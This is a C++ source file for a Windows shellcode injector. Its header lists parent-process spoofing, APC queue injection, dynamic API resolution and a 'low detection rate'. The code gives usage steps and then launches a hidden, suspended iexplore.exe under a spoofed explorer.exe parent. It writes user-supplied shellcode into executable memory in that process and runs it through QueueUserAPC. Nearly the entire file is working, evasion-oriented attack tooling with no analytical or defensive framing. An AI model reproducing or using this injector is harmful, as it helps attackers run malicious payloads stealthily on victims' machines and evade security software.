/*
            Author: Mohammad Khorram
            Description: A simple tool to inject shellcode into the remote process.
            features: 
            - Parent Process Spoofing
            - Injection through APC 
            - Dynamic API resolution
            - Low detection rate

            How to use:
            1- Put your shellcode in the shellcode variable
            2- Put your desired process full path in TargetProcess variable (Default value: iexplore.exe full path)
            3- Put your desired parent process in ParentProcess variable (Default value: "explorer.exe")
            4- Compile it
            5- Execute it through CommandLine

/**/


#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

HMODULE kernel32 = GetModuleHandleA("kernel32.dll");


DWORD getPPID(const wchar_t* ParentProcess) {


    using CreateToolhelp32SnapshotPrototype = HANDLE(WINAPI*)(DWORD, DWORD);
    CreateToolhelp32SnapshotPrototype CreateToolhelp32Snapshot = (CreateToolhelp32SnapshotPrototype)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");

    using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
    Process32FirstPrototype Process32First = (Process32FirstPrototype)GetProcAddress(kernel32, "Process32FirstW");

    using Process32NextPrototype = Process32FirstPrototype;
    Process32NextPrototype Process32Next = (Process32NextPrototype)GetProcAddress(kernel32, "Process32NextW");

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    
    if (Process32First(snapshot, &process)) {

        do {
            
            if (!wcscmp(process.szExeFile, ParentProcess))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);

    return process.th32ProcessID;
}

int main() {

    

    unsigned char shellCode[] = "";


    LPCSTR TargetProcess = "C:\\Program Files\\internet explorer\\iexplore.exe";
    const wchar_t* ParentProcess = L"explorer.exe";


    // Getting the address of the functions
    using ZeroMemoryPrototype = VOID(WINAPI*)(PVOID, SIZE_T);
    ZeroMemoryPrototype ZeroMemory = (ZeroMemoryPrototype)GetProcAddress(kernel32, "ZeroMemory");

    using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    OpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(kernel32, "OpenProcess");

    using InitializeProcThreadAttributeListPrototype = BOOL(WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST , DWORD , DWORD , PSIZE_T);
    InitializeProcThreadAttributeListPrototype InitializeProcThreadAttributeList = (InitializeProcThreadAttributeListPrototype)GetProcAddress(kernel32, "InitializeProcThreadAttributeList");

    using GetProcessHeapPrototype = HANDLE(WINAPI*)();
    GetProcessHeapPrototype GetProcessHeap = (GetProcessHeapPrototype)GetProcAddress(kernel32, "GetProcessHeap");

    using HeapAllocPrototype = LPVOID(WINAPI*)(HANDLE , DWORD , SIZE_T);
    HeapAllocPrototype HeapAlloc = (HeapAllocPrototype)GetProcAddress(kernel32, "HeapAlloc");

    using UpdateProcThreadAttributePrototype = BOOL(WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR , PVOID , SIZE_T , PVOID , PSIZE_T);
    UpdateProcThreadAttributePrototype UpdateProcThreadAttribute = (UpdateProcThreadAttributePrototype)GetProcAddress(kernel32, "UpdateProcThreadAttribute");

    using CreateProcessAPrototype = BOOL(WINAPI*)(LPCSTR , LPSTR , LPSECURITY_ATTRIBUTES , LPSECURITY_ATTRIBUTES , BOOL , DWORD , LPVOID , LPCSTR , LPSTARTUPINFOA , LPPROCESS_INFORMATION);
    CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(kernel32, "CreateProcessA");

    using VirtualAllocExPrototype = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T , DWORD , DWORD);
    VirtualAllocExPrototype VirtualAllocEx = (VirtualAllocExPrototype)GetProcAddress(kernel32, "VirtualAllocEx");

    using WriteProcessMemoryPrototype = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WriteProcessMemoryPrototype WriteProcessMemory = (WriteProcessMemoryPrototype)GetProcAddress(kernel32, "WriteProcessMemory");

    using QueueUserAPCPrototype = DWORD(WINAPI*)(PAPCFUNC , HANDLE, ULONG_PTR);
    QueueUserAPCPrototype QueueUserAPC = (QueueUserAPCPrototype)GetProcAddress(kernel32, "QueueUserAPC");

    using ResumeThreadPrototype = DWORD(WINAPI*)(HANDLE);
    ResumeThreadPrototype ResumeThread = (ResumeThreadPrototype)GetProcAddress(kernel32, "ResumeThread");





    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getPPID(ParentProcess));

    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(TargetProcess, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    return EXIT_SUCCESS;
}
